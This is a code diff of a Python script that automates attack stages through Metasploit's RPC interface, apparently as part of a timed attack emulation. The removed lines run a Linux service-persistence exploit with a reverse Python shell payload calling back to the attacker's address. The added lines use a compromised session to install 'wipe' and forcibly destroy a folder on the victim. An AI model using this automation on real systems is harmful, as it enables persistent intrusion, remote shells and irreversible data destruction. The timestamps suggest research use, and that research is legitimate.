@@ -20,31 +20,22 @@ def main(argv):
 
     client = MsfRpcClient('kali')
 
-    exploit = client.modules.use('exploit', 'linux/local/service_persistence')
-    payload = client.modules.use('payload', 'cmd/unix/reverse_python')
-    exploit['SESSION'] = 1
-    exploit['VERBOSE'] = True
-    payload['LHOST'] = my_ip
-
-    time.sleep(2)
-    output_time_file = 'time_stage_2_start.txt'
+    # start step 7
+    output_time_file = 'time_stage_7_start.txt'
     record_timestamp(folder, output_time_file)
     time.sleep(2)
 
-    exploit.execute(payload=payload)
+    shell = client.sessions.session('4')
+    shell.write('apt install wipe -y')
+    time.sleep(30)
+    shell.write("wipe -f {0}".format(wipe_disk_folder))
 
     while client.jobs.list:
         time.sleep(1)
 
-    # print(client.sessions.list['2'])
-
-    client.sessions.session('1').stop()
-    client.sessions.session('2').stop()
-
     time.sleep(10)
-    output_time_file = 'time_stage_2_end.txt'
+    output_time_file = 'time_stage_7_end.txt'
     record_timestamp(folder, output_time_file)
     time.sleep(2)
-
 
 main(sys.argv)
